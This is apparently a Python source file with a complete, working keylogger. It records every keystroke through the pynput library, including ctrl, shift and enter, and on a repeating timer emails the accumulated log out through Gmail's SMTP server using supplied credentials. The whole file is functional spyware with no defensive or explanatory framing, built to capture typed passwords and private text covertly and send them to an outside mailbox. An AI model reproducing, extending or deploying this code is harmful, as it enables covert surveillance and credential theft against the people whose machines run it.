import pynput.keyboard
import threading
import smtplib



class Keylogger:

    def __init__(self,time,email,password):
        self.log = "keylogger started"
        self.time = time
        self.email = email
        self.password = password

    def append_to_string(self, string):
        self.log = self.log + str(string)


    def process_keylogger(self,key):

        try:
            current_log = str(key.char)
        except AttributeError:
            if key == key.space:
                current_log = " "
            elif key == key.ctrl:
                current_log = " (ctrl) "
            elif key == key.shift:
                current_log = " (shift) "
            elif key == key.alt:
                current_log = " (alt) "
            elif key == key.enter:
                current_log = " (enter) "
            elif key == key.backspace:
                current_log = " (backspace) "
            else:
                current_log = " " + str(key) + " "
        self.append_to_string(current_log)



    def report(self):

        if self.log:
            self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        time = threading.Timer(self.time, self.report)
        time.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keylogger)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()